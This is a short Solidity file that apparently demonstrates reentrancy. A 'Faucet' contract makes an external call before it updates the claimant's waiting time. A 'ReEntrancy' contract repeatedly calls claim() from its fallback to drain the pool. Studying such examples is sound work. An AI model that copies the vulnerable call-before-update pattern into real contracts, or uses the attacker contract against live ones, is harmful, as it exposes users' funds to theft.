// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract Faucet {
    uint256 public etherPool = 10;
    mapping(address => uint256) public balances;
    mapping(address => uint256) public WaitingTime;

    function claim() public {
        require(
            block.timestamp > WaitingTime[msg.sender],
            "Waiting Time not expired"
        );
        balances[msg.sender]++;
        etherPool--;

        (bool success, ) = msg.sender.call(msg.data);
        require(success, "Failed to send Funds");

        WaitingTime[msg.sender] = block.timestamp + 1 days;
    }

    function nextFaucetRound() external view returns (uint256) {
        return block.timestamp >= WaitingTime[msg.sender] ? 0 : WaitingTime[msg.sender] - block.timestamp;
    }
}

contract ReEntrancy {
    Faucet public faucet;

    constructor(address _addr) {
        faucet = Faucet(_addr);
    }

    fallback() external {
        if (faucet.etherPool() > 0) {
        faucet.claim();
        }
    }

    function attack() external payable {
        require(faucet.etherPool() > 0);
        faucet.claim();
    }
}
